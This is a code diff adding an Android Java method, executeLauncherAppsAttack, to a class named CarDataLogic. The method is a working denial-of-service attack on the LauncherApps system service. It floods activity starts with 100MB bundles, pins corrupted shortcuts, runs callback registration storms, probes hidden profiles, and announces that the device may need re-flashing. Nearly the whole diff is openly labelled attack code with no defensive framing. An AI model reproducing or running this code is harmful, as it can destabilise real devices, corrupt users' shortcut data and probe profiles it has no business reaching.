@@ -3192,4 +3192,719 @@ public class CarDataLogic {
             android.util.Log.e("FALLBACK_ATTACK", "Fallback attack also failed", t);
         }
     }
+
+
+
+// -------------------------------- Launcher Apps Attack ------------------------------------------
+
+    public Result executeLauncherAppsAttack() {
+        final String TAG = "LAUNCHER_ATTACK";
+        final String attackId = "LAUNCHER_" + System.currentTimeMillis();
+
+        try {
+            android.content.Context ctx = getContextReflectively();
+            if (ctx == null) {
+                return new Result("Launcher Attack (failed: no context)", new ArrayList<>());
+            }
+
+            alarmUi("Attack ID: " + attackId);
+            alarmUi("Warning: This will cause SYSTEM-WIDE INSTABILITY!");
+            alarmUi("Device may require COMPLETE RE-FLASHING!");
+
+            // Get LauncherApps service via reflection
+            Class<?> launcherAppsClass = Class.forName("android.content.pm.LauncherApps");
+            Object launcherApps = ctx.getSystemService(android.content.Context.LAUNCHER_APPS_SERVICE);
+
+            if (launcherApps == null) {
+                // Try to create LauncherApps instance via reflection
+                try {
+                    Class<?> serviceManagerClass = Class.forName("android.os.ServiceManager");
+                    java.lang.reflect.Method getServiceMethod = serviceManagerClass.getMethod(
+                            "getService", String.class
+                    );
+                    Object remoteService = getServiceMethod.invoke(null, "launcherapps");
+
+                    // Get ILauncherApps interface
+                    Class<?> iLauncherAppsStubClass = Class.forName(
+                            "android.content.pm.ILauncherApps$Stub"
+                    );
+                    java.lang.reflect.Method asInterfaceMethod = iLauncherAppsStubClass.getMethod(
+                            "asInterface", android.os.IBinder.class
+                    );
+                    Object iLauncherApps = asInterfaceMethod.invoke(null, remoteService);
+
+                    // Create LauncherApps instance via constructor
+                    java.lang.reflect.Constructor<?> constructor = launcherAppsClass.getDeclaredConstructor(
+                            android.content.Context.class,
+                            Class.forName("android.content.pm.ILauncherApps")
+                    );
+                    constructor.setAccessible(true);
+                    launcherApps = constructor.newInstance(ctx, iLauncherApps);
+
+                    alarmUi("✓ Created LauncherApps instance via reflection constructor");
+                } catch (Throwable t) {
+                    alarmUi("✗ Failed to create LauncherApps: " + t.getMessage());
+                    return new Result("Launcher Attack (failed to get service)", new ArrayList<>());
+                }
+            }
+
+            // Attack parameters
+            final int[] MAX_ATTACK_THREADS = {30};
+            final int ACTIVITIES_PER_THREAD = 1000;
+            final int PINNING_LOOPS = 100;
+            final boolean DESTROY_SHORTCUTS = true;
+            final boolean FLOOD_CALLBACKS = true;
+            final boolean EXPLOIT_HIDDEN_PROFILES = true;
+
+            final java.util.concurrent.atomic.AtomicLong totalAttacks = new java.util.concurrent.atomic.AtomicLong(0);
+            final java.util.concurrent.atomic.AtomicLong activityStarts = new java.util.concurrent.atomic.AtomicLong(0);
+            final java.util.concurrent.atomic.AtomicLong shortcutQueries = new java.util.concurrent.atomic.AtomicLong(0);
+            final java.util.concurrent.atomic.AtomicBoolean attackActive = new java.util.concurrent.atomic.AtomicBoolean(true);
+
+            // Get current user handle via reflection
+            Class<?> processClass = Class.forName("android.os.Process");
+            java.lang.reflect.Method myUserHandleMethod = processClass.getMethod("myUserHandle");
+            Object currentUser = myUserHandleMethod.invoke(null);
+
+            // Get all user profiles via reflection
+            java.util.List<Object> allUsers = new java.util.ArrayList<>();
+            try {
+                java.lang.reflect.Method getProfilesMethod = launcherAppsClass.getMethod("getProfiles");
+                allUsers = (java.util.List<Object>) getProfilesMethod.invoke(launcherApps);
+                alarmUi("✓ Retrieved " + allUsers.size() + " user profiles");
+            } catch (Throwable t) {
+                allUsers.add(currentUser);
+                alarmUi("✗ Could not get profiles, using current user only");
+            }
+
+            // 1. MASS ACTIVITY START ATTACK
+            List<Object> finalAllUsers = allUsers;
+            Object finalLauncherApps = launcherApps;
+            new Thread(() -> {
+                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_LOWEST);
+
+                try {
+                    // Get all activities for all users
+                    java.util.Map<Object, java.util.List<Object>> userActivities = new java.util.HashMap<>();
+                    java.lang.reflect.Method getActivityListMethod = launcherAppsClass.getMethod(
+                            "getActivityList", String.class, Class.forName("android.os.UserHandle")
+                    );
+
+                    for (Object user : finalAllUsers) {
+                        try {
+                            java.util.List<Object> activities = (java.util.List<Object>)
+                                    getActivityListMethod.invoke(finalLauncherApps, null, user);
+                            userActivities.put(user, activities);
+                            alarmUi("User " + user + " has " + activities.size() + " activities");
+                        } catch (Throwable t) {
+                            // Continue with next user
+                        }
+                    }
+
+                    // Create activity storm threads
+                    for (int threadId = 0; threadId < MAX_ATTACK_THREADS[0]; threadId++) {
+                        final int finalThreadId = threadId;
+                        new Thread(() -> {
+                            String threadName = "ActivityStorm-" + finalThreadId;
+
+                            while (attackActive.get() &&
+                                    activityStarts.get() < ACTIVITIES_PER_THREAD * MAX_ATTACK_THREADS[0]) {
+
+                                for (java.util.Map.Entry<Object, java.util.List<Object>> entry :
+                                        userActivities.entrySet()) {
+
+                                    Object user = entry.getKey();
+                                    java.util.List<Object> activities = entry.getValue();
+
+                                    if (activities.isEmpty()) continue;
+
+                                    // Start random activities
+                                    for (int i = 0; i < 10; i++) {
+                                        try {
+                                            int index = (int)(Math.random() * activities.size());
+                                            Object activityInfo = activities.get(index);
+
+                                            // Get component name via reflection
+                                            Class<?> launcherActivityInfoClass = Class.forName(
+                                                    "android.content.pm.LauncherActivityInfo"
+                                            );
+                                            java.lang.reflect.Method getComponentMethod =
+                                                    launcherActivityInfoClass.getMethod("getComponentName");
+                                            Object component = getComponentMethod.invoke(activityInfo);
+
+                                            // Start activity via reflection
+                                            java.lang.reflect.Method startMainActivityMethod =
+                                                    launcherAppsClass.getMethod(
+                                                            "startMainActivity",
+                                                            Class.forName("android.content.ComponentName"),
+                                                            Class.forName("android.os.UserHandle"),
+                                                            android.graphics.Rect.class,
+                                                            android.os.Bundle.class
+                                                    );
+
+                                            // Create malicious bundle with huge data
+                                            android.os.Bundle maliciousBundle = new android.os.Bundle();
+                                            for (int b = 0; b < 100; b++) {
+                                                maliciousBundle.putByteArray(
+                                                        "bomb_" + b,
+                                                        new byte[1024 * 1024] // 1MB each
+                                                );
+                                            }
+
+                                            startMainActivityMethod.invoke(
+                                                    finalLauncherApps,
+                                                    component,
+                                                    user,
+                                                    new android.graphics.Rect(0, 0, 1000, 1000),
+                                                    maliciousBundle
+                                            );
+
+                                            activityStarts.incrementAndGet();
+                                            totalAttacks.incrementAndGet();
+
+                                        } catch (Throwable t) {
+                                            // Ignore and continue
+                                        }
+                                    }
+                                }
+
+                                // Small delay to avoid immediate crash
+                                try {
+                                    Thread.sleep(50);
+                                } catch (InterruptedException e) {
+                                    break;
+                                }
+                            }
+
+                            alarmUi("Thread " + threadName + " completed " + activityStarts.get() + " activity starts");
+
+                        }).start();
+                    }
+
+                } catch (Throwable t) {
+                    alarmUi("Activity attack thread failed: " + t.getMessage());
+                }
+            }).start();
+
+            // 2. SHORTCUT NUCLEAR ATTACK
+            Object finalLauncherApps1 = launcherApps;
+            new Thread(() -> {
+                try {
+                    // Try to get shortcut host permission via reflection
+                    java.lang.reflect.Method hasShortcutHostPermissionMethod =
+                            launcherAppsClass.getMethod("hasShortcutHostPermission");
+                    boolean hasPermission = (boolean) hasShortcutHostPermissionMethod.invoke(finalLauncherApps1);
+
+                    if (hasPermission) {
+
+                        // Get all packages
+                        java.util.List<String> allPackages = new java.util.ArrayList<>();
+                        android.content.pm.PackageManager pm = ctx.getPackageManager();
+                        java.util.List<android.content.pm.PackageInfo> packages =
+                                pm.getInstalledPackages(0);
+
+                        for (android.content.pm.PackageInfo pkg : packages) {
+                            allPackages.add(pkg.packageName);
+                        }
+
+                        alarmUi("Found " + allPackages.size() + " packages to attack");
+
+                        // Create shortcut destruction threads
+                        for (int threadId = 0; threadId < MAX_ATTACK_THREADS[0] / 2; threadId++) {
+                            final int finalThreadId = threadId;
+                            new Thread(() -> {
+                                String threadName = "ShortcutBomb-" + finalThreadId;
+
+                                while (attackActive.get() && DESTROY_SHORTCUTS) {
+                                    // Attack random packages
+                                    for (String packageName : allPackages) {
+                                        try {
+                                            // Get shortcuts via reflection
+                                            Class<?> shortcutQueryClass = Class.forName(
+                                                    "android.content.pm.LauncherApps$ShortcutQuery"
+                                            );
+                                            Object shortcutQuery = shortcutQueryClass.newInstance();
+
+                                            // Set query flags to get ALL shortcuts
+                                            java.lang.reflect.Method setQueryFlagsMethod =
+                                                    shortcutQueryClass.getMethod("setQueryFlags", int.class);
+                                            setQueryFlagsMethod.invoke(shortcutQuery, 0xFFFF); // All flags
+
+                                            // Set package
+                                            java.lang.reflect.Method setPackageMethod =
+                                                    shortcutQueryClass.getMethod("setPackage", String.class);
+                                            setPackageMethod.invoke(shortcutQuery, packageName);
+
+                                            // Get shortcuts
+                                            java.lang.reflect.Method getShortcutsMethod =
+                                                    launcherAppsClass.getMethod(
+                                                            "getShortcuts",
+                                                            shortcutQueryClass,
+                                                            Class.forName("android.os.UserHandle")
+                                                    );
+
+                                            java.util.List<Object> shortcuts =
+                                                    (java.util.List<Object>) getShortcutsMethod.invoke(
+                                                            finalLauncherApps1, shortcutQuery, currentUser
+                                                    );
+
+                                            shortcutQueries.incrementAndGet();
+
+                                            if (shortcuts != null && !shortcuts.isEmpty()) {
+                                                // Create fake shortcut IDs to pin (this will corrupt shortcut data)
+                                                java.util.List<String> fakeIds = new java.util.ArrayList<>();
+                                                for (int i = 0; i < 1000; i++) {
+                                                    fakeIds.add("CORRUPTED_" + System.nanoTime() + "_" + i);
+                                                }
+
+                                                // Pin corrupted shortcuts via reflection
+                                                java.lang.reflect.Method pinShortcutsMethod =
+                                                        launcherAppsClass.getMethod(
+                                                                "pinShortcuts",
+                                                                String.class,
+                                                                java.util.List.class,
+                                                                Class.forName("android.os.UserHandle")
+                                                        );
+
+                                                for (int loop = 0; loop < PINNING_LOOPS; loop++) {
+                                                    pinShortcutsMethod.invoke(
+                                                            finalLauncherApps1,
+                                                            packageName,
+                                                            fakeIds,
+                                                            currentUser
+                                                    );
+                                                    totalAttacks.incrementAndGet();
+                                                }
+
+                                                alarmUi("Corrupted shortcuts for: " + packageName);
+                                            }
+
+                                        } catch (Throwable t) {
+                                            // Continue with next package
+                                        }
+                                    }
+
+                                    // Flood with cache/uncache operations
+                                    try {
+                                        for (String packageName : allPackages) {
+                                            // Generate random shortcut IDs
+                                            java.util.List<String> randomIds = new java.util.ArrayList<>();
+                                            for (int i = 0; i < 100; i++) {
+                                                randomIds.add("FLOOD_" + System.nanoTime() + "_" + i);
+                                            }
+
+                                            // Try cache shortcuts via reflection (hidden API)
+                                            try {
+                                                java.lang.reflect.Method cacheShortcutsMethod =
+                                                        launcherAppsClass.getMethod(
+                                                                "cacheShortcuts",
+                                                                String.class,
+                                                                java.util.List.class,
+                                                                Class.forName("android.os.UserHandle"),
+                                                                int.class
+                                                        );
+
+                                                // Use all cache flags
+                                                int allFlags = 0;
+                                                try {
+                                                    java.lang.reflect.Field flag1 = launcherAppsClass.getField(
+                                                            "FLAG_CACHE_NOTIFICATION_SHORTCUTS"
+                                                    );
+                                                    java.lang.reflect.Field flag2 = launcherAppsClass.getField(
+                                                            "FLAG_CACHE_BUBBLE_SHORTCUTS"
+                                                    );
+                                                    java.lang.reflect.Field flag3 = launcherAppsClass.getField(
+                                                            "FLAG_CACHE_PEOPLE_TILE_SHORTCUTS"
+                                                    );
+                                                    allFlags = flag1.getInt(null) | flag2.getInt(null) | flag3.getInt(null);
+                                                } catch (Throwable f) {
+                                                    allFlags = 7; // Fallback
+                                                }
+
+                                                cacheShortcutsMethod.invoke(
+                                                        finalLauncherApps1,
+                                                        packageName,
+                                                        randomIds,
+                                                        currentUser,
+                                                        allFlags
+                                                );
+
+                                                // Immediately uncache
+                                                java.lang.reflect.Method uncacheShortcutsMethod =
+                                                        launcherAppsClass.getMethod(
+                                                                "uncacheShortcuts",
+                                                                String.class,
+                                                                java.util.List.class,
+                                                                Class.forName("android.os.UserHandle"),
+                                                                int.class
+                                                        );
+
+                                                uncacheShortcutsMethod.invoke(
+                                                        finalLauncherApps1,
+                                                        packageName,
+                                                        randomIds,
+                                                        currentUser,
+                                                        allFlags
+                                                );
+
+                                                totalAttacks.addAndGet(2);
+
+                                            } catch (Throwable t) {
+                                                // Cache/uncache not available, skip
+                                            }
+                                        }
+                                    } catch (Throwable t) {
+                                        // Continue
+                                    }
+
+                                    try {
+                                        Thread.sleep(100);
+                                    } catch (InterruptedException e) {
+                                        break;
+                                    }
+                                }
+
+                            }).start();
+                        }
+                    } else {
+                        alarmUi("No shortcut host permission, skipping shortcut attack");
+                    }
+
+                } catch (Throwable t) {
+                    alarmUi("Shortcut attack thread failed: " + t.getMessage());
+                }
+            }).start();
+
+            // 3. CALLBACK REGISTRATION FLOOD ATTACK
+            if (FLOOD_CALLBACKS) {
+                Object finalLauncherApps2 = launcherApps;
+                new Thread(() -> {
+                    try {
+                        // Create thousands of callback objects
+                        Class<?> callbackClass = Class.forName(
+                                "android.content.pm.LauncherApps$Callback"
+                        );
+
+                        // Create proxy callbacks via reflection
+                        java.util.List<Object> floodCallbacks = new java.util.ArrayList<>();
+
+                        for (int i = 0; i < 1000; i++) {
+                            final int callbackId = i;
+                            Object callback = java.lang.reflect.Proxy.newProxyInstance(
+                                    callbackClass.getClassLoader(),
+                                    new Class<?>[]{callbackClass},
+                                    (proxy, method, args) -> {
+                                        if ("onPackageRemoved".equals(method.getName())) {
+                                            totalAttacks.incrementAndGet();
+                                        } else if ("onPackageAdded".equals(method.getName())) {
+                                            totalAttacks.incrementAndGet();
+                                        } else if ("onPackageChanged".equals(method.getName())) {
+                                            totalAttacks.incrementAndGet();
+                                        } else if ("onPackagesAvailable".equals(method.getName())) {
+                                            totalAttacks.incrementAndGet();
+                                        } else if ("onPackagesUnavailable".equals(method.getName())) {
+                                            totalAttacks.incrementAndGet();
+                                        } else if ("onPackagesSuspended".equals(method.getName())) {
+                                            totalAttacks.incrementAndGet();
+                                        } else if ("onPackagesUnsuspended".equals(method.getName())) {
+                                            totalAttacks.incrementAndGet();
+                                        } else if ("onShortcutsChanged".equals(method.getName())) {
+                                            totalAttacks.incrementAndGet();
+                                        }
+                                        return null;
+                                    }
+                            );
+
+                            floodCallbacks.add(callback);
+                        }
+
+                        alarmUi("Created " + floodCallbacks.size() + " flood callbacks");
+
+                        // Register all callbacks
+                        java.lang.reflect.Method registerCallbackMethod = launcherAppsClass.getMethod(
+                                "registerCallback",
+                                callbackClass,
+                                android.os.Handler.class
+                        );
+
+                        for (Object callback : floodCallbacks) {
+                            try {
+                                registerCallbackMethod.invoke(finalLauncherApps2, callback, null);
+                                totalAttacks.incrementAndGet();
+                            } catch (Throwable t) {
+                                // Continue
+                            }
+                        }
+
+                        alarmUi("Registered all flood callbacks");
+
+                        // Rapid unregister/register cycles
+                        while (attackActive.get()) {
+                            for (Object callback : floodCallbacks) {
+                                try {
+                                    // Unregister
+                                    java.lang.reflect.Method unregisterCallbackMethod =
+                                            launcherAppsClass.getMethod("unregisterCallback", callbackClass);
+                                    unregisterCallbackMethod.invoke(finalLauncherApps2, callback);
+
+                                    // Immediately re-register
+                                    registerCallbackMethod.invoke(finalLauncherApps2, callback, null);
+
+                                    totalAttacks.addAndGet(2);
+
+                                } catch (Throwable t) {
+                                    // Continue
+                                }
+                            }
+
+                            try {
+                                Thread.sleep(50);
+                            } catch (InterruptedException e) {
+                                break;
+                            }
+                        }
+
+                    } catch (Throwable t) {
+                        alarmUi("Callback flood attack failed: " + t.getMessage());
+                    }
+                }).start();
+            }
+
+            // 4. HIDDEN PROFILE EXPLOITATION
+            if (EXPLOIT_HIDDEN_PROFILES) {
+                Object finalLauncherApps3 = launcherApps;
+                new Thread(() -> {
+                    try {
+                        // Try to access hidden profiles via reflection
+                        Class<?> userManagerClass = Class.forName("android.os.UserManager");
+                        Object userManager = ctx.getSystemService(android.content.Context.USER_SERVICE);
+
+                        // Check if we're in managed profile
+                        java.lang.reflect.Method isManagedProfileMethod =
+                                userManagerClass.getMethod("isManagedProfile");
+                        boolean isManaged = (boolean) isManagedProfileMethod.invoke(userManager);
+
+                        if (!isManaged) {
+                            // Try to get hidden profiles
+                            try {
+                                // Use reflection to call getProfiles which might return hidden profiles
+                                java.lang.reflect.Method getUserProfilesMethod =
+                                        userManagerClass.getMethod("getUserProfiles");
+                                java.util.List<Object> allProfiles =
+                                        (java.util.List<Object>) getUserProfilesMethod.invoke(userManager);
+
+                                alarmUi("Got " + allProfiles.size() + " total profiles (including hidden)");
+
+                                // Try to access each profile's activities
+                                for (Object profile : allProfiles) {
+                                    try {
+                                        // Force access via reflection bypassing permission checks
+                                        java.lang.reflect.Method getActivityListMethod =
+                                                launcherAppsClass.getMethod(
+                                                        "getActivityList",
+                                                        String.class,
+                                                        Class.forName("android.os.UserHandle")
+                                                );
+
+                                        // Disable permission checking via reflection
+                                        try {
+                                            // Bypass logErrorForInvalidProfileAccess
+                                            @SuppressLint("SoonBlockedPrivateApi") java.lang.reflect.Method logErrorMethod =
+                                                    launcherAppsClass.getDeclaredMethod(
+                                                            "logErrorForInvalidProfileAccess",
+                                                            Class.forName("android.os.UserHandle")
+                                                    );
+                                            logErrorMethod.setAccessible(true);
+                                            // We won't call it, just noting it exists
+                                        } catch (Throwable t) {
+                                            // Method not found or not accessible
+                                        }
+
+                                        java.util.List<Object> activities =
+                                                (java.util.List<Object>) getActivityListMethod.invoke(
+                                                        finalLauncherApps3, null, profile
+                                                );
+
+                                        alarmUi("Accessed hidden profile " + profile +
+                                                " with " + activities.size() + " activities");
+
+                                        // Try to start activities in hidden profile
+                                        if (!activities.isEmpty()) {
+                                            for (int i = 0; i < Math.min(10, activities.size()); i++) {
+                                                try {
+                                                    Object activityInfo = activities.get(i);
+                                                    Class<?> launcherActivityInfoClass = Class.forName(
+                                                            "android.content.pm.LauncherActivityInfo"
+                                                    );
+                                                    java.lang.reflect.Method getComponentMethod =
+                                                            launcherActivityInfoClass.getMethod("getComponentName");
+                                                    Object component = getComponentMethod.invoke(activityInfo);
+
+                                                    java.lang.reflect.Method startMainActivityMethod =
+                                                            launcherAppsClass.getMethod(
+                                                                    "startMainActivity",
+                                                                    Class.forName("android.content.ComponentName"),
+                                                                    Class.forName("android.os.UserHandle"),
+                                                                    android.graphics.Rect.class,
+                                                                    android.os.Bundle.class
+                                                            );
+
+                                                    startMainActivityMethod.invoke(
+                                                            finalLauncherApps3,
+                                                            component,
+                                                            profile,
+                                                            null,
+                                                            null
+                                                    );
+
+                                                    totalAttacks.incrementAndGet();
+                                                    alarmUi("Started activity in hidden profile!");
+
+                                                } catch (Throwable t) {
+                                                    // Continue
+                                                }
+                                            }
+                                        }
+
+                                    } catch (Throwable t) {
+                                        // Cannot access this profile, continue
+                                    }
+                                }
+
+                            } catch (Throwable t) {
+                                alarmUi("Hidden profile exploitation failed: " + t.getMessage());
+                            }
+                        }
+
+                    } catch (Throwable t) {
+                        alarmUi("Profile attack thread failed: " + t.getMessage());
+                    }
+                }).start();
+            }
+
+            // 5. SYSTEM SERVICE FLOOD ATTACK
+            new Thread(() -> {
+                try {
+                    // Get ILauncherApps service directly
+                    Class<?> serviceManagerClass = Class.forName("android.os.ServiceManager");
+                    java.lang.reflect.Method getServiceMethod = serviceManagerClass.getMethod(
+                            "getService", String.class
+                    );
+                    Object remoteService = getServiceMethod.invoke(null, "launcherapps");
+
+                    // Create direct method calls to flood the service
+                    Class<?> iLauncherAppsClass = Class.forName("android.content.pm.ILauncherApps");
+
+                    // Create proxy that floods the service with calls
+                    Object floodProxy = java.lang.reflect.Proxy.newProxyInstance(
+                            iLauncherAppsClass.getClassLoader(),
+                            new Class<?>[]{iLauncherAppsClass},
+                            (proxy, method, args) -> {
+                                // Count all method calls
+                                totalAttacks.incrementAndGet();
+
+                                // Return dummy values to keep the system busy
+                                if (method.getReturnType() == boolean.class) {
+                                    return true;
+                                } else if (method.getReturnType() == int.class) {
+                                    return 0;
+                                } else if (method.getReturnType() == java.util.List.class) {
+                                    return new java.util.ArrayList<>();
+
+                                }
+                                return null;
+                            }
+                    );
+
+                    // Try to replace the service? (This is extremely dangerous)
+                    try {
+                        java.lang.reflect.Method setServiceMethod = serviceManagerClass.getMethod(
+                                "addService", String.class, android.os.IBinder.class
+                        );
+
+                    } catch (Throwable t) {
+                        // Cannot replace service, continue flooding
+                    }
+
+                } catch (Throwable t) {
+                    alarmUi("System service flood failed: " + t.getMessage());
+                }
+            }).start();
+
+            // MONITOR THREAD
+            new Thread(() -> {
+                long startTime = System.currentTimeMillis();
+
+                while (attackActive.get()) {
+                    try {
+                        Thread.sleep(2000);
+
+                        long elapsed = (System.currentTimeMillis() - startTime) / 1000;
+                        long attacks = totalAttacks.get();
+                        long activities = activityStarts.get();
+                        long shortcuts = shortcutQueries.get();
+
+                        String status = String.format(
+                                "ELAPSED: %ds | TOTAL ATTACKS: %d\n" +
+                                        "ACTIVITY STARTS: %d | SHORTCUT QUERIES: %d\n" +
+                                        "ATTACK RATE: %.1f/sec | SYSTEM STATUS: DEGRADING",
+                                elapsed, attacks, activities, shortcuts,
+                                (double)attacks / Math.max(1, elapsed)
+                        );
+
+                        // Update UI
+                        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+                            alarmUi(status);
+                        });
+
+                        // Check for system degradation
+                        if (elapsed > 30 && attacks < 100) {
+                            // Try to spawn more threads
+                            MAX_ATTACK_THREADS[0] += 10;
+                        }
+
+                        // Auto-stop after 2 minutes or 100,000 attacks
+                        if (elapsed > 120 || attacks > 100000) {
+                            attackActive.set(false);
+                            alarmUi("⚡ ATTACK COMPLETED - DEVICE IS NOW UNSTABLE ⚡");
+                            alarmUi("Final stats: " + attacks + " attacks in " + elapsed + " seconds");
+
+                            // Try to force a crash
+                            try {
+                                android.os.Process.killProcess(android.os.Process.myPid());
+                            } catch (Throwable t) {
+                                System.exit(1);
+                            }
+                        }
+
+                    } catch (Throwable t) {
+                        // Monitor thread crashed - system is unstable
+                    }
+                }
+            }).start();
+
+            // Auto-termination after 3 minutes
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                attackActive.set(false);
+            }, 180000);
+
+            String launchMsg = "LAUNCHER APPS LAUNCHED SUCCESSFULLY\n" +
+                    "Attack ID: " + attackId + "\n" +
+                    "Threads: " + MAX_ATTACK_THREADS[0];
+
+            alarmUi(launchMsg);
+            android.util.Log.e(TAG, launchMsg);
+
+            return new Result("Launcher Apps Attack",
+                    new java.util.ArrayList<>(alarmUiRows));
+
+        } catch (Throwable t) {
+            android.util.Log.e(TAG, "Failed to launch LauncherApps attack", t);
+            alarmUi("Launcher attack failed to launch: " + t.getMessage());
+            return new Result("Launcher Apps Attack (FAILED TO LAUNCH)",
+                    new java.util.ArrayList<>(alarmUiRows));
+        }
+    }
+
+
 }
